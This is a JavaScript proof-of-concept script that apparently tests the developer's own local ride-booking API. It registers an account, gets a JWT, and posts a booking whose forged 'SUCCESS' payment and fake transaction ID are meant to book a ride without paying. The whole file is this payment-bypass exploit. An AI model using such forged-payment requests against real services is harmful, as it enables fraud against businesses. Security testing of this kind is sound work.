const BASE_URL = 'http://localhost:3000/api/v1'; // Corrected port
const HACKER_USER = {
    email: `hacker_${Date.now()}@example.com`,
    password: 'password123',
    name: 'Evil Hacker',
    phone: '9999999999'
};

async function runExploit() {
    try {
        console.log('--- STARTING ATTACK: BOOKING BYPASS ---');

        // 1. Register a new "attacker" account
        console.log('[*] Registering hacker account...');
        const registerRes = await fetch(`${BASE_URL}/auth/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(HACKER_USER)
        });
        if (!registerRes.ok) throw new Error('Registration failed');
        console.log('[+] Hacker registered successfully.');

        // 2. Login to get JWT
        console.log('[*] Logging in...');
        const loginRes = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: HACKER_USER.email,
                password: HACKER_USER.password
            })
        });
        if (!loginRes.ok) throw new Error('Login failed');
        const { token } = await loginRes.json();
        console.log('[+] Obtained JWT token.');

        // 3. Attempt to bypass payment by hitting the "after-payment" endpoint directly
        console.log('[*] Attempting to book a ride without actual payment verification...');
        const bookingPayload = {
            pickupLocation: 'Hacker Hideout',
            dropLocation: 'Victim HQ',
            totalAmount: 5000,
            distanceKm: 25,
            carModel: 'Luxury SUV',
            payment: {
                amount: 5000,
                currency: 'INR',
                status: 'SUCCESS',
                provider: 'fake_razorpay',
                providerTxnId: 'FAKE_TXN_' + Date.now()
            }
        };

        const bookingRes = await fetch(`${BASE_URL}/bookings/after-payment`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify(bookingPayload)
        });

        if (bookingRes.status === 201) {
            const data = await bookingRes.json();
            console.log('[!!!] EXPLOIT SUCCESSFUL [!!!]');
            console.log('Booked a ride for FREE! Booking ID:', data.booking.id);
            console.log('Booking Status:', data.booking.status);
        } else {
            const errData = await bookingRes.json();
            console.log('[-] Exploit failed. Status:', bookingRes.status, errData);
        }

    } catch (err) {
        console.error('[!] Error during exploit:', err.message);
    }
}

runExploit();
